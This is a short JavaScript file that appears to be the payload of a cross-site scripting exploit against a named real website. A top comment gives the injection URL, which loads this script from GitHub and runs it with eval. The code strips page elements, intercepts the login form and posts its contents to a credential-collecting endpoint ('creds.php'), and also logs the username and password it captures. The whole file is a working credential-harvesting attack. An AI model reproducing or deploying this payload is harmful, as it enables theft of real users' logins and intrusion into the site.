// http://www.arnadal.no/?message=%3Cscript%3E$.get(%22https://raw.githubusercontent.com/BlackFalcons/arnadal-XSS-exploit/main/payload.js%22,r=%3E{eval(r)});%3C/script%3E
$( document ).ready(function () {
    document.querySelector("#doc4 > a").remove()
    document.querySelector("#activitylist").remove()
    document.querySelector(".information").remove()

    const loginButton = document.querySelectorAll("input")[2]

    $("form").submit(function (e) {
        e.preventDefault()

        const form = $(this)
        const url = "localhost/creds.php"

        $.ajax({
            "type": "POST",
            "url": url,
            "data": form.serialize()
        })
    })
    
    loginButton.addEventListener("click",  event => {
        let username = document.querySelector("#UserName").value
        let password = document.querySelector("#Password").value

        if (username && password) {
            console.log("Username: " + username)
            console.log("Password: " + password)
        }
    })
})

